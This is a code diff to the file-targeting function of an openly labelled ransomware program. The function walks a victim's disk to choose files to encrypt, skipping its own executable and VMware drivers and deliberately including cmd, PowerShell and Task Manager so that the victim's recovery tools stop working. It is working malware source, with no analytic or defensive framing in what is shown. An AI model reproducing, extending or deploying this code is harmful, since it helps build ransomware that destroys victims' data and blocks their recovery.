@@ -47,21 +47,26 @@ def discoverFiles(startpath):
         'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
     ]
 
-    for dirpath, dirs, files in os.walk(shlex.quote(startpath)):
+    SPECIAL_FILES = ['cmd', 'powershell', 'Taskmgr']
+
+    for dirpath, dirs, files in os.walk(startpath):
         for i in files:
             absolute_path = os.path.abspath(os.path.join(dirpath, i))
             # don't want to crypt the malware itself
             if 'main.exe' in absolute_path:
                 continue
+            # don't want to crypt VMWare drivers
+            if 'VMware' in absolute_path:
+                continue
             # don't want to crypt system files. Need the OS to still work
             if 'Windows' not in absolute_path:
+                print(absolute_path)
                 yield absolute_path
             else:
                 # but it would be nice if somethings didn't work
-                if 'cmd' in absolute_path or \
-                                'powershell' in absolute_path or \
-                                'Taskmgr' in absolute_path:
-                    yield absolute_path
+                for f in SPECIAL_FILES:
+                    if f in absolute_path:
+                        yield absolute_path
 
 
 if __name__ == "__main__":
